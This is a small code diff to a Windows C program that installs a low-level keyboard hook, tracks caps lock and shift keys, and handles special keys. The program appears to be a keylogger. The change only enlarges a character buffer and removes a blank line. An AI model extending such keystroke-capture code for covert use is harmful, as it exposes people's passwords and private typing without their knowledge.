@@ -23,7 +23,7 @@ char timestamp[256];
 HWND hwnd;
 SYSTEMTIME st;
 char keyboard_state[256];
-wchar_t buf[2];
+wchar_t buf[3];
 char *key_pressed;
 char  output[256];
 
@@ -220,7 +220,6 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
         if (info->vkCode == VK_SPACE || info->vkCode == VK_RETURN || info->vkCode == VK_BACK 
             || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || ret == 1)
             handleSpecial(info->vkCode, key_pressed);
-
 
         if ((capsLock && (!shift_pressed[0] || !shift_pressed[1])) || (!capsLock && (shift_pressed[0] || shift_pressed[1])))
             if (!specialCombinaison(info->vkCode, key_pressed))
